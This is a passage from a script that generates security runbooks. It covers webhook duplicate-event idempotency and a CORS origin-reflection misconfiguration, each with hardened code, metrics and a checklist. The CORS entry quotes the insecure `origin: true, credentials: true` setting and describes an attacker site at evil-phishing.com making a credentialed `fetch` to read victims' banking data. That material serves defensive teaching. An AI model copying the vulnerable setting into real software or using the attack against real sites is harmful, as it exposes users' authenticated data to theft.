    // 3. Execute financial credit
    await client.query(
      'UPDATE merchant_balances SET balance_cents = balance_cents + $1 WHERE id = $2',
      [amountCents, merchantId]
    );

    await client.query('COMMIT');
    return { duplicate: false, success: true };
  } catch (err) {
    await client.query('ROLLBACK');
    await redis.del(lockKey); // Allow retry on transient failure
    throw err;
  } finally {
    client.release();
  }
}`,
    monitoringMetrics: [
      "sum(rate(duplicate_webhook_events_received_total[1m]))",
      "count(redis_lock_contention_total{service='webhooks'})",
      "financial_discrepancy_alert_gauge"
    ],
    productionChecklist: [
      "Enforce unique constraints in SQL on provider event IDs (e.g. 'event_id' UNIQUE).",
      "Use Redis SETNX distributed locking to prevent concurrent race conditions on fast duplicate retries.",
      "Check timestamp tolerances on webhook headers and reject events older than 300 seconds.",
      "Return HTTP 200 on duplicate replays after verifying idempotency so upstream webhooks stop retrying."
    ]
  },
  {
    id: "sec-prod-14",
    topic: "CORS Origin Reflection Misconfiguration Permitting Cross-Origin Authenticated Data Theft",
    category: "Web Application Defense",
    severity: "P0 - Critical Breach",
    theProblem: "An internal banking portal API suffered massive data exfiltration. Developers attempting to resolve CORS issues on a staging domain deployed the following Express configuration to production: app.use(cors({ origin: true, credentials: true })). An attacker created evil-phishing.com containing JavaScript that made authenticated requests to api.bank.com/account/balance; the server reflected the origin, allowing the attacker's script to read victim banking records.",
    howItWorksInternally: "Setting \`origin: true\` in the popular \`cors\` npm package dynamically reflects whatever \`Origin\` header the client sends. When combined with \`credentials: true\`, the server returns: \`Access-Control-Allow-Origin: https://evil-phishing.com\` and \`Access-Control-Allow-Credentials: true\`. When a logged-in user visits the attacker's website, the attacker's JavaScript makes a cross-origin \`fetch(apiUrl, { credentials: 'include' })\`. The victim's browser includes the session cookies, the server reflects the attacker's origin as permitted, and the browser grants the attacker full JavaScript access to the response body.",
    productionCode: `// middleware/cors.ts - Production Fixed Implementation
import cors from 'cors';

// Strict Hardcoded Whitelist: NEVER use 'origin: true' or regex wildcards!
const TRUSTED_ORIGINS = new Set([
  'https://app.enterprise.com',
  'https://portal.enterprise.com'
]);

export const hardenedCors = cors({
  origin: (requestOrigin, callback) => {
    // Allow non-browser tools (curl, server-to-server) where origin is undefined
    if (!requestOrigin) return callback(null, true);

    if (TRUSTED_ORIGINS.has(requestOrigin)) {
      return callback(null, true);
    }

    // Explicitly reject untrusted origin
    return callback(new Error('CORS Violation: Origin not whitelisted'));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  maxAge: 86400 // Cache preflight for 24 hours
});`,
    monitoringMetrics: [
      "sum(rate(cors_origin_rejections_total[1m]))",
      "count(distinct(http_request_header_origin)) by (client_ip)",
      "waf_cross_origin_violation_count"
    ],
    productionChecklist: [
      "Search codebase for 'origin: true' or 'origin: *' paired with 'credentials: true' and replace with explicit Set whitelist.",
      "Never whitelist 'null' as an accepted origin (attackers generate null origins via sandboxed iframes).",
      "Set 'Vary: Origin' HTTP header so caching proxies do not serve reflected CORS headers to other users.",
      "Run automated DAST scanners asserting that untrusted origins receive no Access-Control-Allow-Origin header."
    ]
  }
];

const outputPath = path.join(__dirname, '../data/security.production.json');
fs.writeFileSync(outputPath, JSON.stringify(runbooks, null, 2), 'utf-8');
console.log(`Successfully generated ${outputPath} with ${runbooks.length} runbooks.`);
